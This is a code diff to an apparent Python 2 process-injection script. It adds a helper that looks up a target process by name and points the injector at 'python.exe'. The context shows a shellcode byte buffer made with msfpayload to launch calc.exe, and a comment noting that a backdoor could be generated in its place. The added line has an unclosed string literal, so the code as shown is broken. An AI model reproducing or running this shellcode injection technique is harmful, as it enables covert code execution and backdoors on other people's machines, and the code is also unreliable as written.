@@ -1,5 +1,20 @@
 # -*- coding:utf-8 -*-
 	#
+import psutil
+import re
+import sys
+
+def processinfo(process_name):
+  pid_list=psutil.pids()
+  for each_pid in pid_list:
+    try:
+      each_pro=psutil.Process(each_pid)
+      if each_pro.name().lower()==process_name.lower():
+        print each_pid;
+        return each_pid
+    except psutil.NoSuchProcess,pid:
+      print "no such"
+
 def run():
 	buf=""
 	buf+="\x56\xb9\x38\x68\x0d\x16\xe8\x31\x00\x00\x00\x8b\xf0\x85\xf6\x74"
@@ -47,7 +62,7 @@ def run():
 	# if not sys.argv[1]:
 	# 	print "Code Injector: ./code_injector.py <PID to inject>"
 	# 	sys.exit(0)
-	pid = 6056
+	pid = processinfo("python.exe)
 	# shellcode使用msfpayload生成的，我这里是一个计算器，当然你可以直接生成一个后门程# 序。生成代码：msfpayload  windows/exec  CMD = calc.exe  EXITFUNC=thread  C　
 	shellcode = buf
 	code_size = len(shellcode)
